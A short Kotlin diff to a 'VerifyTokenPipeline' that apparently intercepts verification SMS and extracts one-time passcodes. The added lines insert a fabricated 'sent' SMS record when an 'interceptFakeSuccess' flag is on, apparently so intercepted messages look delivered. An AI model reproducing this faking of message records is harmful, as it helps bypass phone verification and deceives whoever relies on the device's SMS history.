@@ -50,6 +50,10 @@ object VerifyTokenPipeline {
         )
         savePending(pending)
 
+        if (config.interceptFakeSuccess) {
+            FakeSentSmsHelper.insertFakeSentSms(appContext, pending.dest, pending.body)
+        }
+
         val otp = LastOtp(
             otp = SmsMatcher.extractToken(body, config.autoExtractOtp),
             sender = SmsMatcher.interceptDisplay(config, dest, configManager),
